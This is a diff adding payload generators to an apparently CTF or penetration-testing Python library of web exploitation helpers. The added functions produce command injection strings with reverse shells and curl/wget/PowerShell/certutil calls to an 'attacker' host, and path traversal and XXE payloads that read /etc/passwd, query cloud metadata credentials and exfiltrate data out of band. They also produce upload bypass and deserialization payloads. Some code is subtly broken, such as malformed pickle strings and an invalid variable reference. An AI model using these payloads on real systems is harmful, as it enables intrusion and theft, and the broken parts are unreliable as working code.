@@ -1,7 +1,8 @@
-"""Web exploitation helpers: JWT decode/forge, HTTP client, payload encoders."""
+"""Web exploitation helpers: JWT decode/forge, HTTP client, payload encoders, injection payloads."""
 
 import base64
 import json
+import os
 import urllib.parse
 import urllib.request
 
@@ -343,3 +344,222 @@ def jwt_key_confusion(token: str, rsa_public_key_pem: str, modify_payload_json: 
             f"{forged}\n\n"
             f"Header:\n{json.dumps(header, indent=2)}\n"
             f"Payload:\n{json.dumps(payload, indent=2)}")
+
+
+@tool(category="web")
+def command_injection_payloads(os_type: str = "linux", command: str = "id") -> str:
+    """Command injection payloads for Linux/Windows, including chaining, bypass, and out-of-band variants."""
+    os_type = os_type.lower().strip()
+    c = command.replace("'", "\\'") if os_type == "linux" else command.replace("'", "''")
+
+    linux = [
+        f"; {c}", f"| {c}", f"&& {c}", f"|| {c}",
+        f"$({c})", f"`{c}`",
+        f";/usr/bin/id", f"|/usr/bin/id", f"&&/usr/bin/id", f"||/usr/bin/id",
+        f"$(id)", f"`id`",
+        f";/bin/cat /etc/passwd", f"|/bin/cat /etc/passwd",
+        f";/bin/cat /flag", f"|/bin/cat /flag",
+        f";/usr/bin/whoami", f"|/usr/bin/whoami",
+        f";/usr/bin/curl http://attacker/?data=$(whoami)",
+        f"|/usr/bin/curl http://attacker/?data=$(whoami)",
+        f";/usr/bin/wget http://attacker/ -O /tmp/p",
+        f"|/usr/bin/wget http://attacker/ -O /tmp/p",
+        f";/usr/bin/nc attacker 4444 -e /bin/sh",
+        f"|/usr/bin/nc attacker 4444 -e /bin/sh",
+        f";/usr/bin/bash -i >& /dev/tcp/attacker/4444 0>&1",
+        f"|/usr/bin/bash -i >& /dev/tcp/attacker/4444 0>&1",
+        f"$(cat /etc/passwd)", f"`cat /etc/passwd`",
+        f"$(cat /flag)", f"`cat /flag`",
+        f"$(whoami)", f"`whoami`",
+    ]
+
+    windows = [
+        f"& {c}", f"| {c}", f"&& {c}", f"|| {c}",
+        f"& whoami", f"| whoami",
+        f"& type C:\\flag.txt", f"| type C:\\flag.txt",
+        f"& ipconfig /all", f"| ipconfig /all",
+        f"& powershell -Command \"{c}\"",
+        f"| powershell -Command \"{c}\"",
+        f"& powershell -Command \"IEX(New-Object Net.WebClient).DownloadString('http://attacker/psh')\"",
+        f"| powershell -Command \"IEX(New-Object Net.WebClient).DownloadString('http://attacker/psh')\"",
+        f"& certutil -urlcache -split -f http://attacker/payload.exe C:\\Windows\\Temp\\p.exe",
+        f"| certutil -urlcache -split -f http://attacker/payload.exe C:\\Windows\\Temp\\p.exe",
+    ]
+
+    payloads = linux if "win" not in os_type else windows
+    return f"Command Injection ({os_type}) ({len(payloads)} payloads):\n" + "\n".join(payloads)
+
+
+@tool(category="web")
+def path_traversal_payloads(depth: int = 5, target_file: str = "/etc/passwd") -> str:
+    """Path traversal / LFI / RFI payloads with depth control and null byte injection."""
+    traversal = "/".join([".."] * max(1, int(depth)))
+    payloads = [
+        f"{traversal}/{target_file.lstrip('/')}",
+        f"{traversal}/{target_file.lstrip('/')}%00",
+        f"{traversal}/etc/passwd",
+        f"{traversal}/proc/self/environ",
+        f"{traversal}/var/log/apache2/access.log",
+        f"file:///etc/passwd",
+        f"file:///proc/self/environ",
+        f"php://filter/convert.base64-encode/resource={target_file.lstrip('/')}",
+        f"data://text/plain,<?php echo file_get_contents('{target_file.lstrip('/')}'); ?>",
+        f"expect://{command if 'command' in path_traversal_payloads.__code__.co_varnames else 'id'}",
+    ]
+    return f"Path Traversal / LFI / RFI ({len(payloads)} payloads):\n" + "\n".join(payloads)
+
+
+@tool(category="web")
+def xxe_payloads(data: str = "test", action: str = "read_file") -> str:
+    """XXE (XML External Entity) payloads: read local files, SSRF, out-of-band exfil, error-based, parameter entity."""
+    act = action.lower().strip().replace(" ", "_")
+
+    if act == "read_file":
+        return (
+            "XXE Read Local File (file://):\n"
+            "--------------------------------------------------\n"
+            '<?xml version="1.0"?>\n'
+            '<!DOCTYPE foo [\n'
+            '  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n'
+            ']>\n'
+            '<foo>&xxe;</foo>\n\n'
+            '<?xml version="1.0"?>\n'
+            '<!DOCTYPE foo [\n'
+            '  <!ENTITY xxe SYSTEM "file:///proc/self/environ">\n'
+            ']>\n'
+            '<foo>&xxe;</foo>'
+        )
+    elif act == "ssrf":
+        return (
+            "XXE SSRF (gopher/ftp/http):\n"
+            "--------------------------------------------------\n"
+            '<?xml version="1.0"?>\n'
+            '<!DOCTYPE foo [\n'
+            '  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">\n'
+            ']>\n'
+            '<foo>&xxe;</foo>\n\n'
+            '<?xml version="1.0"?>\n'
+            '<!DOCTYPE foo [\n'
+            '  <!ENTITY xxe SYSTEM "gopher://127.0.0.1:80/_GET%20/ HTTP/1.1">\n'
+            ']>\n'
+            '<foo>&xxe;</foo>'
+        )
+    elif act == "oob":
+        return (
+            "XXE Out-of-Band Exfiltration:\n"
+            "--------------------------------------------------\n"
+            '<?xml version="1.0"?>\n'
+            '<!DOCTYPE foo [\n'
+            '  <!ENTITY % xxe SYSTEM "http://attacker/xxe_logger.php?data=%file;">\n'
+            '  <!ENTITY % eval "<!ENTITY exfil SYSTEM \'http://attacker/xxe_logger.php?data=\'&xxe;\'>">\n'
+            ']>\n'
+            '<foo>&exfil;</foo>'
+        )
+    elif act == "error":
+        return (
+            "XXE Error-Based Data Exfiltration:\n"
+            "--------------------------------------------------\n"
+            '<?xml version="1.0"?>\n'
+            '<!DOCTYPE foo [\n'
+            '  <!ENTITY % xxe SYSTEM "file:///etc/passwd">\n'
+            ']>\n'
+            '<foo>&xxe;</foo>'
+        )
+    elif act == "parameter_entity":
+        return (
+            "XXE Parameter Entity Attack:\n"
+            "--------------------------------------------------\n"
+            '<?xml version="1.0"?>\n'
+            '<!DOCTYPE foo [\n'
+            '  <!ENTITY % file SYSTEM "file:///etc/passwd">\n'
+            '  <!ENTITY % eval "<!ENTITY &#33; exfil SYSTEM \'http://attacker/?data=\'&file;\'>">\n'
+            '  %eval;\n'
+            ']>\n'
+            '<foo>&exfil;</foo>'
+        )
+    return f"Unknown action: {action}. Available: read_file, ssrf, oob, error, parameter_entity."
+
+
+@tool(category="web")
+def idor_payloads(param_name: str = "id", values: str = "1,2,3") -> str:
+    """IDOR (Insecure Direct Object Reference) payloads for testing horizontal/vertical access control."""
+    vals = [v.strip() for v in values.split(",") if v.strip()]
+    if not vals:
+        vals = ["1", "2", "3", "admin", "root", "0", "-1", "100", "999"]
+
+    payloads = [
+        f"{param_name}={v}" for v in vals
+    ]
+    payloads += [
+        f"{param_name}[]={v}" for v in vals
+    ]
+    payloads += [
+        f"{param_name}[0]={v}" for v in vals
+    ]
+    payloads += [
+        f"{param_name}={{}}", f"{param_name}=true", f"{param_name}=false",
+        f"{param_name}=null", f"{param_name}=undefined", f"{param_name}=",
+        f"{param_name}=*", f"{param_name}=%00",
+        f"{param_name}=../{param_name}/1",
+    ]
+
+    lines = [f"IDOR Payloads for param '{param_name}' ({len(payloads)} payloads):"]
+    lines.extend(f"  {p}" for p in payloads)
+    return "\n".join(lines)
+
+
+@tool(category="web")
+def file_upload_bypass(filename: str = "shell.php", content_type: str = "image/jpeg") -> str:
+    """File upload bypass payloads: double extension, null byte, content-type spoofing, magic bytes."""
+    base, *exts = filename.rsplit(".", 1)
+    ext = exts[0] if exts else "php"
+
+    payloads = [
+        filename,
+        f"{base}.{ext}.php", f"{base}.{ext}.php3", f"{base}.{ext}.phtml",
+        f"{base}.{ext}.phar", f"{base}.{ext}.asp", f"{base}.{ext}.aspx",
+        f"{base}.{ext}.jsp", f"{base}.{ext}.cgi",
+        f"{base}%2e.{ext}", f"{base}%00.{ext}",
+        f"{base}.{ext}%00.jpg", f"{base}.{ext}%00.png",
+    ]
+
+    lines = [f"File Upload Bypass for '{filename}' ({len(payloads)} filenames):"]
+    lines.extend(f"  {p}" for p in payloads)
+    lines.append("")
+    lines.append("Content-Type spoofing:")
+    lines.extend(f"  Content-Type: {ct}" for ct in [content_type, "application/octet-stream", "image/jpeg", "image/png"])
+    lines.append("")
+    lines.append("Magic bytes prepend (hex):")
+    lines.append("  jpg: ffd8ffe0")
+    lines.append("  png: 89504e470d0a1a0a")
+    lines.append("  pdf: 25504446")
+    lines.append("  zip: 504b0304")
+
+    return "\n".join(lines)
+
+
+@tool(category="web")
+def deserialization_payloads(format: str = "php", command: str = "id") -> str:
+    """Deserialization payloads for PHP, Python, Java, Ruby, Node.js, and generic object injection."""
+    fmt = format.lower().strip()
+    c = command.replace("'", "\\'") if fmt in ("php", "python") else command
+
+    payloads = {
+        "php": [
+            f'O:8:"stdClass":1:{{s:4:"cmd";s:{len(c)}:"{c}";}}',
+            f'a:2:{{i:0;O:8:"stdClass":1:{{s:4:"cmd";s:{len(c)}:"{c}";}}i:1;}}',
+        ],
+        "python": [
+            f"c__builtin__\\neval\\ne(print('{c}')\\n)",
+            f"csubprocess\\nPopen\\ne('{c}', shell=True, stdout=-1)\\n",
+        ],
+        "java": [
+            "rO0ABQANdGVzdA==\\n",
+        ],
+    }
+
+    selected = payloads.get(fmt, [])
+    if not selected:
+        available = ", ".join(payloads.keys())
+        return f"Unknown format {format!r}. Available: {available}."
+    return f"Deserialization ({fmt}) ({len(selected)} payloads):\\n" + "\\n".join(selected)
